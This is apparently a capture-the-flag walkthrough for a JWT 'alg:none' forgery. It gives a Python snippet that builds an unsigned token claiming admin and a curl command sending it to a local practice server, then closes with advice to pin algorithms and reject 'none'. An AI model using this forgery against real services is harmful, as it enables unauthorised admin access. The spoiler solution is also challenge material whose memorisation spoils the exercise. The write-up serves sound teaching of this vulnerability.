# Walkthroughs — hard tier (SPOILERS)

## jwt — alg:none forgery

The server verifies a JWT but trusts the algorithm named in the token's own
header. Set `alg` to `none`, leave the signature empty, and claim to be admin.

```bash
python3 - <<'PY'
import base64, json
b64 = lambda o: base64.urlsafe_b64encode(json.dumps(o, separators=(",",":")).encode()).decode().rstrip("=")
header = b64({"alg": "none", "typ": "JWT"})
payload = b64({"user": "admin"})
print(f"{header}.{payload}.")   # note the trailing dot: empty signature
PY
```

Send it:

```bash
curl -s http://127.0.0.1:5000/ctf/jwt-admin -H "Authorization: Bearer <token-from-above>"
```

The response JSON contains the flag.

**Lesson:** never let the token dictate how it is verified. Pin the accepted
algorithm server-side, reject `none`, and verify the signature with your key.
Prefer a vetted JWT library configured with an explicit algorithm allowlist.
